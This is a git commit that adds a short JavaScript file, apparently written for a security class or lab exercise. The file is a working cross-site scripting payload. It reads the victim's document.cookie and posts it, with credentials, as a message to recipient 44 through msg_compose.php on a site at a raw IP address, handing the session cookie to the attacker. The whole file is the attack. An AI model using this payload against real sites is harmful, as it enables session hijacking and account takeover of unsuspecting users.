d4277c4754e619b8983054ffd1dfc2d41dd9a323
An Vo <30716416+tienlatien252@users.noreply.github.com>
2018-11-14 11:28:23 -0600

    Create script3.js

---
+++ script3.js
@@ -0,0 +1,9 @@
+    var xmlHttp = new XMLHttpRequest();
+
+    xmlHttp.open("POST", "http://128.83.34.154//msg_compose.php", true);
+
+    xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+    xmlHttp.withCredentials = true;
+
+    xmlHttp.send('form_recipient=44&form_message=' + document.cookie + "&send_message=");
